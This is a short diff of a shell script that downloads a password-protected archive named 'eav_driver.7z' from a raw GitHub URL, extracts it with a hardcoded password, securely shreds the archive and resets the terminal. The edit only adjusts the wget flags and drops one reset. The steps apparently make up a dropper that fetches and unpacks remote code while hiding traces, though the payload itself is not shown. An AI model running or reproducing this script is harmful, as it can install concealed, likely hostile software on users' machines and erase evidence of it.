@@ -5,8 +5,7 @@ if [ $? -eq 0 ]; then
     echo $weJoy
     cd $weJoy
  
- wget -bqO -nc https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z 
- reset
+ wget -qOnc https://raw.githubusercontent.com/codecpacka/scripts/refs/heads/main/Resources/eav_driver.7z 
  7z x eav_driver.7z -pRats@9033 -aoa
  shred -u -z *.7z 
  reset
